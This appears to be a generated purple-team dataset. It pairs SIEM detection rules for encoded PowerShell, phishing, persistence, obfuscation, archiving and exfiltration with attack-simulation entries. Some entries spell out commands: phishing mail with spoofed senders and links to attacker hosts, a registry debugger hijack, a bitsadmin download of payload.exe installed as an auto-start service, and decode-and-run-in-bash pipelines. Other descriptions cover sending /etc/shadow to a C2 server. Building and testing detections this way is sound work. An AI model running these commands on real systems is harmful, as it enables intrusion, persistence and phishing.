rules.title: Phishing: Office Document Launches Encoded PowerShell
rules.description: Detects PowerShell processes started by Office applications (WINWORD, EXCEL, OUTLOOK) that contain encoded commands, indicative of phishing payload execution.

detection.condition: (selection_suspicious or selection_wrapper) and (parent_winword or parent_excel or parent_outlook) and not exclusion_benign

falsepositives: Legitimate Office macros that invoke PowerShell for automation
System management tools (e.g., SCCM) that use encoded PowerShell
Azure AD Connect service updates that run PowerShell with encoded arguments

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Suspicious PowerShell Encoded Command Execution
rules.description: Detects PowerShell execution with encoded commands or base64 patterns commonly used in malicious activity, while excluding known benign management tools.
falsepositives: Legitimate administrative scripts using encoded commands
Automated deployment tools using PowerShell with encoding (outside excluded parents)

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Encoded PowerShell Execution for System Process Creation
rules.description: Detects PowerShell commands executed with encoded payloads (e.g., -EncodedCommand or -enc) that may be used to create or modify system processes, while excluding known legitimate tools such as SCCM and Azure AD Connect.

detection.condition: (selection or selection_pwsh or selection_enc) and base64 and not benign_parent and not benign_parent2

falsepositives: Legitimate administrative scripts that use encoded PowerShell (e.g., SCCM deployment scripts, Azure AD Connect sync scripts).
Security or monitoring tools that wrap PowerShell commands in an encoded form for automation.
Custom in‑house deployment tools that invoke PowerShell with -EncodedCommand for obfuscation.

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Application Layer Protocol Detection
rules.description: Detects Application Layer Protocol activity via NLP pattern matching
falsepositives: System administrators using command-line tools for legitimate purposes
Software updates or installations using these tools

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.title: Obfuscated PowerShell Commands with Encoded Payloads
rules.description: Detects PowerShell processes executing encoded commands or containing large Base64 strings, indicative of obfuscation techniques (T1027).

detection.condition: (encoded_ps or encoded_ps_short or base64_ps or pwsh_exe or pwsh_exe_short or pwsh_base64) and not (benign_parent or benign_azure)

falsepositives: Legitimate administrative scripts that use -EncodedCommand for deployment
System Center Configuration Manager (SCCM) executing PowerShell with encoded commands
Azure AD Connect service invoking PowerShell for synchronization tasks

siem_verification.message: Verification complete (via Keyword Fallback - Check Splunk Field Extractions)

rules.description: Detected Exfiltration Over C2 Channel activity via NLP pattern matching

rules.title: Detection: Archive Collected Data
rules.description: Detected Archive Collected Data activity via NLP pattern matching

attacks.description: Creates a .lnk shortcut file in the TEMP directory that points to notepad.exe, simulating a malicious attachment used in phishing.
attacks.expected_behavior: A shortcut file named phish.lnk is created in %TEMP%; opening the file launches Notepad, demonstrating how a phishing attachment can execute code.

attacks.command: powershell -Command "Send-MailMessage -From 'attacker@example.com' -To 'victim@example.com' -Subject 'Important Update' -Body 'Please see the attached document.' -Attachments \"$env:TEMP\\phish.txt\" -SmtpServer 'smtp.test.local'"
attacks.description: Sends a phishing email with a benign text attachment using PowerShell's Send-MailMessage cmdlet.
attacks.expected_behavior: An email is dispatched to the victim address via the specified SMTP server, containing a simple text file attachment, emulating a typical phishing delivery.

attacks.description: Creates a Base64‑encoded dummy executable (placeholder), decodes it with certutil, and launches it, representing a common phishing payload delivery via encoded attachment.
attacks.expected_behavior: A dummy executable file is generated in %TEMP% from a Base64 string, then executed, simulating the execution of a malicious attachment after a user opens it.

attacks.command:
printf "Subject: Important Update
From: "IT Support" <itsupport@example.com>
To: user@example.com

Please click the link below to update your password:
http://malicious.example.com/verify
" | sendmail -t
attacks.description: Creates a simple phishing email with a malicious link and sends it using the local sendmail utility.
attacks.expected_behavior: An email is dispatched to user@example.com appearing to come from IT Support, containing a link to a malicious site.

attacks.command:
printf "Subject: Security Alert
From: security@example.org
To: victim@example.com

Your account has been compromised. Reset here: http://bad.example.com/reset
" | sendmail -f spoofed@example.org -t
attacks.description: Crafts a phishing email that spoofs the sender address using the -f option of sendmail, increasing credibility.
attacks.expected_behavior: An email is sent to victim@example.com appearing to originate from security@example.org, but the envelope sender is spoofed as spoofed@example.org.

attacks.command:
(echo -e "EHLO attacker.com
MAIL FROM:<phisher@attacker.com>
RCPT TO:<victim@example.com>
DATA
Subject: Urgent Action Required
From: Phisher <phisher@attacker.com>

Please verify your credentials at http://evil.example.com/login
.
QUIT
" ) | openssl s_client -starttls smtp -connect mail.example.com:587
attacks.description: Uses openssl s_client to establish a TLS‑encrypted SMTP session and manually issues SMTP commands to deliver a phishing email with a malicious link.
attacks.expected_behavior: A TLS connection is opened to mail.example.com on port 587, and raw SMTP commands are sent to deliver a phishing message to victim@example.com.

attacks.description: Basic PowerShell execution that prints a test string to the console.
attacks.expected_behavior: The command outputs the text 'Test PowerShell Execution' to the console.

attacks.description: Intermediate PowerShell usage: creates a temporary folder, writes a sample file, and compresses the folder into a zip archive.
attacks.expected_behavior: A new directory 'ps_demo' is created in %TEMP%, a file 'sample.txt' containing 'sample data' is written, and a zip archive 'ps_demo.zip' is produced in %TEMP%.

attacks.command: powershell -Command "schtasks /Create /SC ONCE /TN PS_Demo_Task /TR 'cmd.exe /c echo Scheduled Task Run > %TEMP%\task.txt' /ST 00:00 /F"
attacks.description: Advanced scenario: uses PowerShell to invoke schtasks.exe and creates a one‑time scheduled task that writes a marker file when executed.
attacks.expected_behavior: A scheduled task named 'PS_Demo_Task' is created; when the task runs (immediately at 00:00), it creates 'task.txt' in %TEMP% containing the text 'Scheduled Task Run'.

attacks.description: Basic demonstration of PowerShell execution by printing a test string.
attacks.expected_behavior: Outputs the string 'Test PowerShell execution on Linux' to the console.

attacks.description: Creates a temporary file, writes sample data to it, and reads the content back.
attacks.expected_behavior: A file named testfile.txt is created in the TEMP directory containing 'Sample data', and its contents are displayed.

attacks.description: Compresses the previously created file into a zip archive, removes the original file, and confirms completion.
attacks.expected_behavior: Creates archive.zip in the TEMP directory containing testfile.txt, deletes testfile.txt, and prints 'Archive created'.

attacks.command: sc create MyService binPath= "C:\Windows\System32\notepad.exe" start= auto
attacks.description: Creates a new Windows service named MyService that automatically starts and launches notepad.exe, demonstrating creation of a system process for persistence.
attacks.expected_behavior: A new service appears in the Services MMC snap‑in; the service status is 'Running' and notepad.exe is launched.

attacks.description: Creates a scheduled task that runs at each user logon, executing a harmless echo command to write a test file, illustrating modification of a system process via task scheduling.
attacks.expected_behavior: The task 'MyLogonTask' is listed in schtasks /Query; on the next logon, %TEMP%\test.txt is created containing the word 'Test'.

attacks.command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
attacks.description: Adds a Debugger value under Image File Execution Options for notepad.exe, causing Windows to launch calc.exe whenever notepad.exe is started, thereby modifying a system process.
attacks.expected_behavior: When notepad.exe is launched, calc.exe starts instead; the registry entry can be verified with reg query.

attacks.command:
echo -e "[Unit]
Description=Test Service
[Service]
ExecStart=/bin/sh -c 'touch /tmp/persistence_test_basic'
[Install]
WantedBy=multi-user.target" | sudo tee /etc/systemd/system/test-basic.service > /dev/null && sudo systemctl daemon-reload && sudo systemctl enable test-basic.service && sudo systemctl start test-basic.service
attacks.description: Creates a new systemd service that runs a harmless touch command, enables it, and starts it to persistently create a file in /tmp.
attacks.expected_behavior: A file /tmp/persistence_test_basic is created, indicating the service was started successfully.

attacks.command: echo "@reboot root /bin/sh -c 'echo cron_test > /tmp/persistence_cron_test'" | sudo tee /etc/cron.d/persistence_test > /dev/null && sudo chmod 644 /etc/cron.d/persistence_test && sudo systemctl restart cron.service
attacks.description: Adds a system‑wide cron job that runs at reboot, executing a harmless echo command to create a marker file.
attacks.expected_behavior: On the next reboot, /tmp/persistence_cron_test will contain the text "cron_test".

attacks.description: Download a benign file over HTTP using certutil, demonstrating application layer protocol usage.
attacks.expected_behavior: certutil contacts the HTTP server, retrieves the file, and saves it to the %TEMP% directory.

attacks.description: Use bitsadmin to download a file via HTTP, showing another native tool that performs application layer communication.
attacks.expected_behavior: bitsadmin initiates an HTTP GET request, downloads the file, and stores it in the %TEMP% directory.

attacks.description: Send a small payload via HTTP POST using PowerShell, illustrating outbound application layer traffic.
attacks.expected_behavior: PowerShell makes an HTTP POST request to the specified URL with the body 'testdata'; no local files are created.

attacks.description: Basic HTTP beacon: sends a GET request to a C2 server embedding the host name as a query parameter.
attacks.expected_behavior: An outbound HTTP request is made to example.com; the response is discarded, so no visible output appears.

attacks.description: Intermediate raw TCP beacon using netcat: sends a simple identifier string to a remote listener and waits briefly for a response.
attacks.expected_behavior: Opens a TCP connection to 203.0.113.10:4444, transmits the beacon, and prints any data returned by the server before the 5‑second timeout.

attacks.description: Advanced TLS beacon: establishes an encrypted connection with OpenSSL, sends a JSON payload containing the host name, and displays any server response.
attacks.expected_behavior: Performs a TLS handshake with secure.example.com on port 443, sends the JSON string, and outputs any reply from the server; errors are suppressed.

attacks.description: Basic obfuscation: encode a clear‑text file to Base64 and decode it to a new file name, hiding the original content.
attacks.expected_behavior: Creates %TEMP%\plain.txt with 'SampleData', then creates %TEMP%\encoded.txt (Base64) and finally writes %TEMP%\obf_payload.exe containing the original data.

attacks.description: Intermediate obfuscation: PowerShell command is Base64‑encoded (UTF‑16LE) to hide the script that writes a file containing a secret string.
attacks.expected_behavior: Decodes the Base64 string and runs the PowerShell script, which creates a file %TEMP%\obf.txt with the content "SecretData".

attacks.description: Advanced obfuscation: embeds a hex‑encoded string, decodes it with certutil to produce a plaintext file, demonstrating data hiding via hex representation.
attacks.expected_behavior: Writes the hex string for "Hello world!" to %TEMP%\hex.txt, then decodes it to %TEMP%\hello.txt containing the original message.

attacks.description: Writes a Base64‑encoded hello‑world script to /tmp, makes it executable, and runs it, showing basic obfuscation via Base64 encoding.
attacks.expected_behavior: The script prints "Hello, world!" to the console.

attacks.command: printf 'echo "Sensitive data: 12345"\n' | gzip -c | base64 > /tmp/payload.gz.b64 && cat /tmp/payload.gz.b64 | base64 -d | gzip -d | bash
attacks.description: Creates a gzip‑compressed script, encodes it with Base64, stores it, then decodes, decompresses, and executes it, demonstrating layered obfuscation.
attacks.expected_behavior: The executed script outputs "Sensitive data: 12345".

attacks.command: export ENC_PWD='s3cr3tP@ss'; echo 'echo "Top secret operation executed"' > /tmp/secret.sh; openssl enc -aes-256-cbc -salt -in /tmp/secret.sh -out /tmp/secret.sh.enc -pass env:ENC_PWD && rm /tmp/secret.sh && cat /tmp/secret.sh.enc | openssl enc -aes-256-cbc -d -salt -pass env:ENC_PWD | bash; unset ENC_PWD
attacks.description: Encrypts a script with OpenSSL using a passphrase stored in an environment variable, deletes the cleartext file, then decrypts and runs it in‑memory, illustrating advanced obfuscation via encryption.
attacks.expected_behavior: The decrypted script prints "Top secret operation executed".

attacks.description: Read a local file and send its raw contents via an HTTP POST request to a C2 server using Invoke-WebRequest.
attacks.expected_behavior: The PowerShell command contacts http://exfil.example.com/collect and uploads the contents of %TEMP%\secret.txt as the request body.

attacks.description: Encode the file to Base64 with certutil, then exfiltrate the encoded string via a DNS TXT lookup to a malicious domain.
attacks.expected_behavior: The command creates a Base64 version of the file, reads it into a variable, and issues a DNS TXT query where the query name contains the encoded data, sending it to c2.example.com.

attacks.description: Open a raw TCP connection to a C2 server and stream the file contents directly over the socket.
attacks.expected_behavior: A TCP socket is created to c2.example.com on port 4444; the contents of %TEMP%\secret.txt are sent through the socket, then the connection is closed.

attacks.description: Basic exfiltration: sends the content of /etc/hostname to a mock C2 HTTP endpoint using curl.
attacks.expected_behavior: The file /etc/hostname is read and its contents are posted to http://c2.example.com/upload; the command returns the HTTP response code.

attacks.description: Intermediate exfiltration: streams the system log over a raw TCP connection to a C2 listener using netcat.
attacks.expected_behavior: The contents of /var/log/syslog are piped to netcat, which opens a TCP connection to c2.example.com on port 4444 and transmits the data. The command exits after the file is fully sent.

attacks.description: Advanced exfiltration: creates a compressed archive of credential files, encodes it in base64, and streams it via netcat to a C2 server.
attacks.expected_behavior: Using sudo, tar creates a gzip archive of /etc/passwd and /etc/shadow, writes it to stdout, which is then base64‑encoded and sent over a TCP connection to c2.example.com on port 5555. The C2 server receives the encoded archive.

attacks.description: Downloads a web shell payload from a public‑facing application after exploiting it, storing the file in the temporary directory.
attacks.expected_behavior: The file webshell.exe is saved to %TEMP% without prompting; certutil outputs a success message.

attacks.description: Sends a crafted POST request to a vulnerable login endpoint, simulating an injection or credential‑stuffing exploit against a public‑facing web application.
attacks.expected_behavior: The request is sent; PowerShell displays the HTTP status code and any response content returned by the server.

attacks.command: bitsadmin /transfer exploitdl /download /priority normal http://vulnerable-app.local/payload.exe %TEMP%\payload.exe && sc.exe create EvilService binPath= "%TEMP%\payload.exe" start= auto
attacks.description: Uses bitsadmin to download a malicious payload from a compromised public‑facing service, then creates a Windows service to achieve persistence.
attacks.expected_behavior: bitsadmin reports download progress and completion; sc.exe creates the service named EvilService pointing to the downloaded executable.

attacks.description: Basic GET request to a public‑facing web endpoint to verify its presence and observe any error messages that may indicate a vulnerability.
attacks.expected_behavior: The command completes silently; if the endpoint is vulnerable, the server may return diagnostic information or a non‑standard HTTP status code.

attacks.description: POST request with a simple SQL injection payload targeting a login form on a public web application.
attacks.expected_behavior: The server responds with either a successful login page (indicating the injection worked) or an error message; no actual credentials are compromised.

attacks.description: Interact with a public FTP service using netcat, sending a sequence of FTP commands that could trigger a command‑injection vulnerability in certain FTP servers.
attacks.expected_behavior: The FTP server replies with standard FTP responses; if the server is vulnerable, additional unexpected behavior (e.g., execution of injected commands) may be observed.

attacks.description: Compress a single collected file into a ZIP archive using PowerShell.
attacks.expected_behavior: Creates data.zip in the TEMP folder containing the contents of collected.txt.

attacks.command: cmd.exe /c "if not exist \"%TEMP%\\collected.txt\" echo Test data > \"%TEMP%\\collected.txt\" && makecab.exe \"%TEMP%\\collected.txt\" \"%TEMP%\\data.cab\""
attacks.description: Create a CAB archive from a test file using the legacy makecab.exe utility.
attacks.expected_behavior: Generates data.cab in the TEMP directory containing the collected.txt file.

attacks.description: Archive multiple collected files with a timestamped ZIP name, handling any errors silently.
attacks.expected_behavior: Creates a ZIP file named data_YYYYMMDD_HHMMSS.zip in the TEMP folder containing all files matching collected_*.txt.

attacks.description: Create a gzip‑compressed tar archive of all .log files in the current user's home directory.
attacks.expected_behavior: A file named collected_data.tar.gz is created in the user's home directory containing copies of the .log files.

attacks.description: Create a zip archive of selected system configuration files (SSH client config and hosts file).
attacks.expected_behavior: A file named collected_config.zip is created in the user's home directory containing the specified configuration files.

attacks.description: Archive all log files under /var/log (excluding *.bak files) and then encrypt the archive with OpenSSL using a test password.
attacks.expected_behavior: Creates /tmp/collected_secure.tar.gz containing the selected logs, then produces an encrypted file /tmp/collected_secure.enc. The original tar file remains for verification.
